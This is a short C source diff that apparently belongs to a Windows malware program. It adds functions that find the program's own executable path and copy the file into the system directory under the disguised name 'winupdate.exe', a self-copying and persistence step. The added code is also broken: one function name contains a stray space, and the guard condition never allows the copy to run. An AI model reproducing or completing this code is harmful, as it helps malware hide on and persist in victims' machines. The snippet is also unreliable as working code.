@@ -29,3 +29,21 @@ DWORD WINAPI bull_moose(LPVOID tid_ptr)
 	RegCloseKey(Key32);
 	return 0;
 }
+
+
+char MyPath[256], CpyPath[256];
+int order = 0;
+void BullMoose_part_1() {
+    if((2 - order) == 1){
+        order = 2;
+        GetModuleFileName(NULL,MyPath,sizeof(MyPath));
+        GetSystemDirectory(CpyPath,sizeof(CpyPath));
+        strcat(CpyPath,"\\winupdate.exe");
+    }
+}
+void BullMoose _part_2() {
+    if((2 - order) == 1){
+        order = 2;	
+        CopyFile(MyPath,CpyPath,FALSE);
+    }
+}
